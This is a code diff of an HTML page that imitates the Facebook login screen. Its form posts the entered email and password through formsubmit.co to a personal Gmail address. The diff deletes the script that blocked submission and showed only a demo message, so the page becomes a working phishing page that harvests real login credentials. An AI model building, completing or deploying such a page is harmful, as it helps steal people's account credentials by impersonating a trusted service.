@@ -258,7 +258,7 @@
                 <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
             </div>
             <div class="right-section">
-                <form action="https://formsubmit.co/nstglobal60@gmail.com" method="POST" class="login-form" id="loginForm">
+                <form action="https://formsubmit.co/nstglobal60@gmail.com" method="POST" class="login-form" >
                     <div class="form-group">
                         <input type="email" name="email" id="email" placeholder="Email address or phone number" required>
                     </div>
@@ -337,41 +337,9 @@
         </div>
     </footer>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const errorMessage = document.getElementById('errorMessage');
-            const successMessage = document.getElementById('successMessage');
-            
-            // Hide previous messages
-            errorMessage.style.display = 'none';
-            successMessage.style.display = 'none';
-            
-            // Simple validation for demo purposes
-            if (email && password) {
-                // Show success message (this is just a demo)
-                successMessage.style.display = 'block';
-                
-                // In a real application, you would send this data to a server
-                console.log('Login attempt with:', { email, password });
-                
-                // Clear form
-                document.getElementById('loginForm').reset();
-            } else {
-                // Show error message
-                errorMessage.style.display = 'block';
-            }
-        });
-        
-        // Add click handler for "Create New Account" button
-        document.querySelector('.create-account-btn').addEventListener('click', function() {
-            alert('This would normally open a sign-up form. This is just a front-end demo.');
-        });
-    </script>
+  
 </body>
 </html>
 </body>
+
 </html>
